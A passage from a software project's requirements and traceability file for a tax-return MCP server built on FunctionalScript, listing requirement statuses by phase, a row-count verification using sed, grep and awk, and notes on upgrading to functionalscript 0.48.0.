> while this table still read `Pending`.

| REQ-ID | Tier | Phase | Milestone | Status |
|--------|------|-------|-----------|--------|
| DOCC-01 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |
| DOCC-02 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |
| DOCC-03 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |
| DOCC-04 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |
| DOCC-05 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |
| DOCC-06 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |
| DOCC-07 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |
| MCP-01 | T0 | Phase 2 - Server Skeleton and Registration | Week 0 | Done |
| MCP-02 | T0 | Phase 2 - Server Skeleton and Registration | Week 0 | Done |
| MCP-03 | T0 | Phase 2 - Server Skeleton and Registration | Week 0 | Done |
| MCP-04 | T0 | Phase 2 - Server Skeleton and Registration | Week 0 | Done |
| MCP-05 | T0 | Phase 2 - Server Skeleton and Registration | Week 0 | Done |
| MCP-06 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Complete |
| MCP-07 | T1 | Phase 8 - TY2025 Parameters and Tax Table | Week 2 | Complete |
| MCP-08 | T2 | Phase 11 - Wage, Retirement, Benefit Documents | Week 3 | Complete |
| MCP-09 | T3 | Phase 15 - Realism Polish and Upstream | Week 5 | Complete |
| TEST-01 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Complete |
| TEST-02 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Complete |
| TEST-03 | T2 | Phases 8-15 - standing, per phase | Weeks 2-5 | Complete |
| TEST-04 | T2 | Phase 7 - `fjs_run` and Run Records | Week 1 | Complete |
| MAINT-01 | T3 | Phase 16 - Orphan Ingestion Island | Phase 31 | **Closed — REMOVED.** `from_ocr` + `ocr_amount` deleted (imported by nothing / only by it); the live `vnd.fjs.ocr` dialect and every `dialect_parity` leaf stay green |
| MAINT-02 | T3 | Phase 17 - Documentation Truth Pass | Phase 17 | **Complete.** `npm run test:proofs` is the separable path, and TEST-04 was amended because measuring it falsified the premise — the proofs are the SLOW half |
| MAINT-03 | T3 | Phase 17 - Documentation Truth Pass | Phase 17 | **Complete.** TAX-02 and DOC-04 corrected in place; the 79/83/95 divergence fixed by putting the derivation COMMAND beside every figure |
| MAINT-04 | T3 | Phase 17 - Documentation Truth Pass | Phase 17 | **Complete.** `implement-mcp-server.md` led with "spec, not implemented" through all ten v2 phases built on it; both DOCC-05 relics gone |
| MAINT-05 | T3 | Phase 17 - Documentation Truth Pass | Phase 17 | **Complete.** The note's proposed fix was not merely vacuous but unconditionally TRUE — a negotiation rejecting every client; corrected with the broken version quoted |
| MAINT-06 | T3 | Phase 18 - Dependency and Duplication Debt | Blocked upstream | **Complete as written**, intent blocked upstream and MEASURED: `^0.43.1` is taken; 0.44/0.45 leave 288 `tsc` errors, each fixable only by a forbidden construct (`fjs/todo/upstream-mjs-migration.md`) |
| MAINT-07 | T3 | Phase 18 - Dependency and Duplication Debt | Complete | Verified |
| MAINT-08 | T3 | Phase 18 - Dependency and Duplication Debt | Complete | Verified |
| EXEC-01 | T0 | Phase 3 - The Restricted Interpreter | Week 1 | Done |
| EXEC-02 | T0 | Delivered upstream (fjs 0.41.0, functionalscript#1419) | Week 1 | Done |
| EXEC-03 | T0 | Phase 3 - The Restricted Interpreter | Week 1 | Done |
| EXEC-04 | T0 | Phase 3 - The Restricted Interpreter | Week 1 | Done |
| EXEC-05 | T0 | Phase 3 - The Restricted Interpreter | Week 1 | Done |
| EXEC-06 | T0 | Phase 3 - The Restricted Interpreter | Week 1 | Done |
| EXEC-07 | T0 | Phase 6 - Guest ABI and Materialization | Week 1 | Complete |
| EXEC-08 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Complete |
| EXEC-09 | T1 | Phase 6 - Guest ABI and Materialization | Week 1 | Complete |
| EXEC-10 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Complete |
| EXEC-11 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Complete |
| EXEC-12 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Complete |
| EXEC-13 | T2 | Phase 19 - Reproducibility and Report Provenance | Week 4 | Complete — SCOPE-BOUNDED: the `pinned` mark and its predicate are real and proven; NO production path gates on it, and none can until Phase 14's acceptance exists. Read the body note before citing this row. |
| DOC-00 | T0 | Phase 5 - Document Base and First Dialects | Week 1 | Complete |
| DOC-01 | T0 | Phase 5 - Document Base and First Dialects | Week 1 | Complete |
| DOC-02 | T0 | Phase 2 - Server Skeleton and Registration | Week 0 | Done |
| DOC-03 | T1 | Phase 5 - Document Base and First Dialects | Week 1 | Complete |
| DOC-04 | T1 | Phase 5 - Document Base and First Dialects | Week 1 | Complete |
| DOC-05 | T2 | Phase 5 - Document Base and First Dialects (pulled forward) | Week 1 | Complete |
| DOC-06 | T2 | Phase 12 - Brokerage and Capital-Gain Chain | Week 3 | Complete |
| DOC-07 | T2 | Phase 12 - Brokerage and Capital-Gain Chain | Week 3 | Complete |
| DOC-08 | T2 | Phase 11 - Wage, Retirement, Benefit Documents | Week 3 | Complete |
| DOC-09 | T2 | Phase 11 - Wage, Retirement, Benefit Documents | Week 3 | Complete |
| DOC-10 | T1 | Phase 5 - Document Base and First Dialects | Week 1 | Complete |
| DOC-11 | T1 | Phase 5 - Document Base and First Dialects | Week 1 | Complete |
| DOC-12 | T1 | Phase 5 - Document Base and First Dialects | Week 1 | Complete |
| DOC-13 | T2 | Phase 12 - Brokerage and Capital-Gain Chain | Week 3 | Complete |
| DOC-14 | T1 | Phase 5 - Document Base and First Dialects | Week 1 | Complete |
| DOC-15 | T2 | Phase 11 - Wage, Retirement, Benefit Documents | Week 3 | Complete |
| DOC-16 | T3 | Phase 15 - Realism Polish and Upstream | Week 5 | Complete |
| DOC-17 | T2 | Phase 5 - Document Base and First Dialects (added) | Week 1 | Complete |
| DOC-18 | T2 | Phase 20 - Unemployment Compensation (retrofitted) | Week 5 | Complete |
| EXACT-01 | T0 | Phase 4 - Exact Arithmetic | Week 1 | Done |
| EXACT-02 | T0 | Phase 4 - Exact Arithmetic | Week 1 | Done |
| EXACT-03 | T0 | Phase 4 - Exact Arithmetic | Week 1 | Done |
| EXACT-04 | T0 | Phase 4 - Exact Arithmetic | Week 1 | Done |
| EXACT-05 | T1 | Phase 4 - Exact Arithmetic | Week 1 | Done |
| TAX-01 | T1 | Phase 8 - TY2025 Parameters and Tax Table | Week 2 | Complete |
| TAX-02 | T1 | Phase 8 - TY2025 Parameters and Tax Table | Week 2 | Complete |
| TAX-03 | T1 | Phase 10 - 1040 Core and Scope Guard | Week 2 | Complete |
| TAX-04 | T1 | Phase 8 - TY2025 Parameters and Tax Table | Week 2 | Complete |
| TAX-05 | T1 | Phase 10 - 1040 Core and Scope Guard | Week 2 | Complete |
| TAX-06 | T1 | Phase 10 - 1040 Core and Scope Guard | Week 2 | Complete |
| TAX-07 | T2 | Phase 12 - Brokerage and Capital-Gain Chain | Week 3 | Complete |
| TAX-08 | T2 | Phase 10 - 1040 Core and Scope Guard | Week 3 | Complete |
| TAX-09 | T2 | Phase 13 - The 65+ Profile and Schedules | Week 3 | Complete |
| TAX-10 | T2 | Phase 13 - The 65+ Profile and Schedules | Week 3 | Complete |
| TAX-11 | T2 | Phase 12.1 - The Capital-Gain Chain | Week 3 | Complete |
| TAX-12 | T2 | Phase 13 - The 65+ Profile and Schedules | Week 3 | Complete |
| TAX-13 | T2 | Phase 13 - The 65+ Profile and Schedules | Week 3 | Complete |
| TAX-14 | T2 | Phase 13 - The 65+ Profile and Schedules | Week 3 | Complete |
| TAX-15 | T2 | Phase 12.1 - The Capital-Gain Chain | Week 3 | Complete |
| TAX-16 | T1 | Phase 10 - 1040 Core and Scope Guard | Week 2 | Complete |
| TAX-17 | T3 | Phase 15 - Realism Polish and Upstream | Week 5 | Complete |
| TAX-18 | T2 | Phase 20 - Unemployment Compensation (retrofitted) | Week 5 | Complete |
| PROV-01 | T1 | Phase 9 - Traceable Report Lines | Week 2 | Complete |
| PROV-02 | T1 | Phase 9 - Traceable Report Lines | Week 2 | Complete |
| PROV-03 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Complete |
| PROV-04 | T2 | Phase 19 - Reproducibility and Report Provenance | Week 4 | Complete |
| PROV-05 | T2 | Phase 19 - Reproducibility and Report Provenance | Week 4 | Complete |
| PROV-06 | T3 | Phase 15 - Realism Polish and Upstream | Week 5 | Complete |
| PROV-07 | T2 | Phase 9 - Traceable Report Lines | Week 2 | Complete |
| PROV-08 | T3 | Phase 15 - Realism Polish and Upstream | Week 5 | Complete |
| SEC-01 | T0 | Phase 2 - Server Skeleton and Registration | Week 0 | Done |
| SEC-02 | T1 | Phase 6 - Guest ABI and Materialization | Week 1 | Complete |
| SEC-03 | T1 | Phase 6 - Guest ABI and Materialization | Week 1 | Complete |
| SEC-04 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |

### Coverage by phase

| Phase | Milestone | Requirements | Count | Tiers |
|-------|-----------|--------------|-------|-------|
| 1. Planning-Document Corrections | Week 0 | DOCC-01, DOCC-02, DOCC-03, DOCC-04, DOCC-05, DOCC-06, DOCC-07, SEC-04 | 8 | T0 |
| 2. Server Skeleton and Registration | Week 0 | MCP-01, MCP-02, MCP-03, MCP-04, MCP-05, SEC-01, DOC-02 | 7 | T0 |
| 3. The Restricted Interpreter | Week 1 | EXEC-01, EXEC-02, EXEC-03, EXEC-04, EXEC-05, EXEC-06 | 6 | T0 |
| 4. Exact Arithmetic | Week 1 | EXACT-01, EXACT-02, EXACT-03, EXACT-04, EXACT-05 | 5 | T0, T1 |
| 5. Document Base and First Dialects | Week 1 | DOC-00, DOC-01, DOC-03, DOC-04, DOC-05, DOC-10, DOC-11, DOC-12, DOC-14, DOC-17 | 10 | T0, T1, T2 |
| 6. Guest ABI and Materialization | Week 1 | EXEC-07, EXEC-09, SEC-02, SEC-03 | 4 | T0, T1 |
| 7. `fjs_run` and Run Records | Week 1 | EXEC-08, EXEC-10, EXEC-11, EXEC-12, PROV-03, MCP-06, TEST-01, TEST-02, TEST-04 | 9 | T1 |
| 8. TY2025 Parameters and Tax Table | Week 2 | TAX-01, TAX-02, TAX-04, MCP-07 | 4 | T1 |
| 9. Traceable Report Lines | Week 2 | PROV-01, PROV-02, PROV-07 | 3 | T1, T2 |
| 10. 1040 Core and Scope Guard | Week 2 | TAX-03, TAX-05, TAX-06, TAX-16 | 4 | T1 |
| 11. Wage, Retirement, Benefit Documents | Week 3 | DOC-08, DOC-09, DOC-15, MCP-08 | 4 | T2 |
| 12. Brokerage and Capital-Gain Chain | Week 3 | DOC-06, DOC-07, DOC-13, TAX-07, TAX-08, TAX-11, TAX-15 | 7 | T2 |
| 13. The 65+ Profile and Schedules | Week 3 | TAX-09, TAX-10, TAX-12, TAX-13, TAX-14 | 5 | T2 |
| 14. Acceptance | Week 4 | *(none - moved to Phase 19)* | 0 | T2 |
| 15. Realism Polish and Upstream | Week 5 | MCP-09, DOC-16, TAX-17, PROV-06, PROV-08 | 5 | T3 |
| 16. The Orphan Ingestion Island *(deferred)* | Week 5 | MAINT-01 | 1 | T3 |
| 17. Documentation Truth Pass | Week 5 | MAINT-02, MAINT-03, MAINT-04, MAINT-05 | 4 | T3 |
| 18. Dependency and Duplication Debt | Week 5 | MAINT-06, MAINT-07, MAINT-08 | 3 | T3 |
| 19. Reproducibility and Report Provenance | Week 4 | EXEC-13, PROV-04, PROV-05 | 3 | T2 |
| 20. Unemployment Compensation *(retrofitted)* | Week 5 | DOC-18, TAX-18 | 2 | T2 |
| *(standing, not a phase)* | Weeks 2-5 | TEST-03 | 1 | T2 |
| **Total** | | | **95** | |

> **This table under-counted by twelve until 2026-08-15.** It summed to 81 against a declared
> 93: Phase 7's row omitted the three TEST requirements the traceability table already assigned
> to it, phases 16, 17 and 18 had no rows at all, and TEST-03 — which maps to a phase *range* —
> had nowhere to go. Every one of those requirements was correctly listed twenty lines above, in
> the traceability table. **This is the project's most-repeated defect: a count that is true of
> the part someone examined and false of the whole.** Re-derive rather than read:
> ```sh
> # rows in the v1 traceability table -- SCOPED, because v2 has its own table below
> sed -n '/^## Traceability/,/^## v2 Requirements/p' .planning/REQUIREMENTS.md \
>   | grep -cE '^\| [A-Z]+-[0-9]+ \|'
> # sum of this table's Count column, excluding the Total row
> awk -F'|' '/^\| ([0-9]+[.] |\*\(standing)/{gsub(/ /,"",$5); s+=$5} END{print s}' .planning/REQUIREMENTS.md
> # the two MUST agree, at 95
> ```
> **The `sed` scoping is load-bearing, not tidiness.** The unscoped `grep` returned **96** the
> moment the v2 section was added, because v2's own traceability table has one single-ID row
> (`| TAX-19 |`) that matches the same pattern. A verification command that silently changes
> meaning when the document grows is not a check — and this one had been correct for exactly
> one day before a new section broke it.

**Cut line.** Phases 1-10 constitute a defensible v1 - the scope guard (TAX-16) is what
makes a partial 1040 honest rather than quietly wrong. Phases 11-13 complete the declared
taxpayer profile, and Phase 14's acceptance test cannot pass without them: a 65+ TY2025
return that omits Schedule 1-A is structurally wrong, not merely incomplete. See
ROADMAP.md "Scope Honesty and the Cut Line".

---
*Scoped 2026-08-03 from PROJECT.md, todo/plan.md, and the research corpus. Tier labels
indicate sequencing pressure, not importance.*

---

## v6 Requirements — A Current Engine, Actually Current (MAINT, DOC)

**One ID coined here on 2026-08-30**, plus five carried forward from v5 unexecuted. The
0.48.0 delta was measured against `0fcb088` before this section was written — the figures
below are observations, not targets, the same discipline the v5 section records.

**Phases 39, 40 and 41 carry forward from v5 at their original numbers**, exactly as 34–36
carried forward from v4. Renumbering them into a tidy v6 sequence would make the ledger look
regular at the cost of every citation that already addresses them by number; this document
has refused that trade twice and refuses it again.

**Why a second bump so soon.** 0.47.0 was taken on 2026-08-27 and 0.48.0 published
2026-08-30T19:06:59Z, three days later. Staying on 0.47.0 was considered and rejected: the
two breaking changes below are mechanical and their cost only grows as this repository
does, and MAINT-11's capability adoption would otherwise be written against a release that
was already superseded before the phase started.

- [x] **MAINT-14** *(T3)*: **Take `functionalscript` 0.48.0.** 235 changed files upstream,
      15 added, 7 removed. Of the 50 upstream modules this repository imports, 28 changed
      and 5 moved. Exactly two changes reach this code, and both are wide but mechanical:

      **`rtti` relocated** from `fjs/types/rtti/…` to `fjs/rtti/…` — **140 import sites**.
      The public constructor surface is unchanged; the only additions are two
      `_`-prefixed internals (`_primitive0List`, `_tag1List`), so this is a path rewrite
      and nothing else.

      **`option` is no longer a function.** 0.47.0 defines `option = t => or(t, undefined)`,
      called as `option(string)`. 0.48.0 defines `option = type0('option')`, a tag used as
      `or(option, string)` — upstream's own `revisionSchema` now reads
      `archived: or(option, true)`. **459 call sites across 34 files** here — the
      "596 across 59" this section first carried counted prose alongside code. Measured
      on the pre-transform tree: 562 occurrences in `.js` (459 calls, 102 docstring
      mentions, and one HTML `<option>` builder that is not rtti at all), plus 36 in
      markdown. Code is rewritten; the 138 prose mentions are corrected as prose.

      **The guard is what the server serves, not that it compiles.** v5's Phase 38 proved
      that a rewrite can typecheck, pass, and still change every schema the application
      serves — the call-site `open()` experiment moved 47 containers while looking like the
      smaller diff. So the same three checks decide this one: `toJsonSchema` over all 31
      dialect schemas **byte-identical** across the bump; the proof-leaf set may only grow,
      never shrink; and no touched module's assertion count falls.

      `^0.47.0` does not admit 0.48.0 — a caret on a `0.x` pins the minor — so this is an
      explicit bump.

### Carried forward from v5, unexecuted

These five keep their v5 text and their phase numbers. What changes is the release they are
written against: 0.47.0 is superseded, so each phase reads 0.48.0's behaviour before acting.

- **MAINT-10** (Phase 39) — the protocol-version gap. **0.47.0 already closed the upstream
  half** and this repository never noticed: `_negotiateVersion(supported, requested)` exists
  and `financeConfig` passes `protocolVersions: ['2025-11-25']`. All three deliverables here
  are untouched — the docstring at lines 14–25 still calls it a live gap and instructs "Do
  not wrap or replace `mcpStep` here to work around it"; lines 23, 310 and 502 still cite
  `fjs/todo/upstream-mcp-protocol-version-negotiation.md`, deleted in `7244f81`; and
  `initializeIgnoresRequestedProtocolVersion` still passes for the wrong reason.

  **The sub-question v5 left open is now answered: no, `financeConfig` does not advertise a
  second revision.** The software is unpublished, so there are no older clients to serve and
  backward compatibility buys nothing. The proof therefore constructs its **own** two-entry
  `McpConfig` — which is all that is needed to tell the two behaviours apart, since with one
  entry the counter-proposal equals the old unconditional pin. The shipped server keeps its
  single pinned revision, and the leaf's name goes with the behaviour it no longer describes.

- **DOC-25** (Phase 40) — dialect validation on the write path.
- **MAINT-11, MAINT-12, MAINT-13** (Phase 41) — new capabilities and the migration report,
  now read against 0.48.0's surface rather than 0.47.0's.

### v6 Traceability

| REQ-ID | Tier | Phase | Milestone | Status |
|--------|------|-------|-----------|--------|
| MAINT-14 | T3 | 42. Take FunctionalScript 0.48.0 | v6 | Complete |
| MAINT-10 | T3 | 39. Retire the Protocol-Version Gap | v6 | Complete |
| DOC-25 | T3 | 40. Validation on the Write Path | v6 | Complete |
| MAINT-11 | T3 | 41. New Capabilities and the Migration Report | v6 | Partial - blocked upstream |
| MAINT-12 | T3 | 41. New Capabilities and the Migration Report | v6 | Complete |
| MAINT-13 | T3 | 41. New Capabilities and the Migration Report | v6 | Complete |

**The five carried-forward IDs appear in both tables on purpose.** The v5 rows are the
record of what that milestone scoped; these are what v6 owns. `parseRequirements` takes an
ID's status from the last row it reads, and both say `Pending`, so the two agree — which is
the only way a duplicate row is allowed to exist here.

